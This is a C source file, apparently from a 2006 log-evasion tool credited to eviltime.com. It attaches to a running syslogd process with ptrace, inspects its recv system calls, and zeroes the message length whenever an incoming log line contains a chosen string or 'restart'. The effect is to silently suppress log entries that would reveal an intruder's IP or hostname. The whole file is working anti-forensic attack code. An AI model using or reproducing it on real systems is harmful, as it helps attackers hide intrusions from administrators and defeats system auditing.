/* 
 * Copyright (C) 2006 eviltime.com
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation;
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * for any question mail me <webmaster@eviltime.com>, 
 * type ./lr26 -h or visit eviltime.com
 */

#include "../includes/locals.h"

#include <stdio.h>
// #include <linux/net.h>    recv() id
#include <sys/types.h>    // waitpid()
#include <sys/wait.h>     // waitpid()
#include <sys/ptrace.h>   // ptrace()
#include <sys/user.h>     // user_regs_struct
#include <signal.h>       // signal() and kill()

#ifndef SYS_RECV
	#define SYS_RECV 10
#endif

#ifndef SYS_RECVFROM
	#define SYS_RECVFROM 10
#endif

struct user_regs_struct user_regs;
char string[SIZE_STR];

void stepNget();
void searchLoop();

pid_t syslog;

int main(int argc, char *argv[]) {
	int ptraceme;

	syslog=atoi(argv[1]);
	if((ptraceme=ptrace(PTRACE_ATTACH, syslog, 0, 0)) != 0) {
  		printf("\t-error: PTRACE_ATTACH on pid %d failed\n", syslog);
		exit(0);
	}
	printf("\t-ptrace(2): syslogd attached on pid (%d)\n", syslog);
	strncpy(string, argv[2], sizeof(string));
	searchLoop();
	return 0;
}

void stepNget() {
	if ((ptrace(PTRACE_SYSCALL, syslog, 0, 0)) != 0)          // step to the next system call
		printf("\t\n-error: PTRACE_SYSCALL on %d (syslogd)\n", syslog);

	waitpid(syslog, NULL, 0);

	if ((ptrace(PTRACE_GETREGS, syslog, 0, &user_regs)) != 0) // copies the syslog registers into user_regs
		printf("\t\n-error: PTRACE_GETREGS on %d (syslogd)\n", syslog);
}

void searchLoop() {
	int i = 0,a;
	u_long m_reg, in_reg, count;
	char *ecx_buffer;
	/* struct user_regs_struct {
	 * 	long int ebx;
	 *      [...]
 	 */
	while(i==0) {
		stepNget();

		/* %ebx contains the syscall number (referring to the linux/net.h list), if we caught
		 * a recv(), maybe some program is calling syslogd to write our confidential information
		 * (IP, hostname etc..) */
 
		if((user_regs.ebx == SYS_RECV) || (user_regs.ebx == SYS_RECVFROM)) {
			stepNget();
			count = user_regs.eax;

			ecx_buffer = calloc(count + 1, sizeof(char));
			m_reg = ptrace(PTRACE_PEEKDATA, syslog, (void *)(user_regs.ecx+4), 0);
			for (a=0; a<count; a+=4) {
				in_reg = ptrace(PTRACE_PEEKDATA, syslog, (void *)(m_reg+a), 0);
				memcpy(ecx_buffer+a, &in_reg, 4);
			}

		/* practical example of the syslogd logging process:
		 *
		 * select(1, [0], NULL, NULL, NULL)        = 1 (in [0])
		 * recv(0, "<38>May 23 13:37:04 sshd[5216]: "..., 1022, 0) = 89
		 * time([1148391424])                      = 1148391424
		 * writev(1, [{"May 23 13:37:04", 15}, {" ", 1}, {"eviltime", 8}, {" ", 1}, [...]
		 *
		 */

			if((strstr(ecx_buffer, string)) || (strstr(ecx_buffer, "restart"))) {
				printf("\n\t-ptrace(2): syslogd is trying to log '%s'", string); 
				/* if the lenght is 0, writev will write nothing in the log */
				user_regs.eax = 0;
				if ( (ptrace(PTRACE_SETREGS, syslog, 0, &user_regs)) != 0) // overwrites the syslogd regs
					printf("\n\t-error: PTRACE_SETREGS on pid %d", syslog);
				else 
					printf(", blocked with success!");
			}
			free(ecx_buffer);			
		}
	}
}

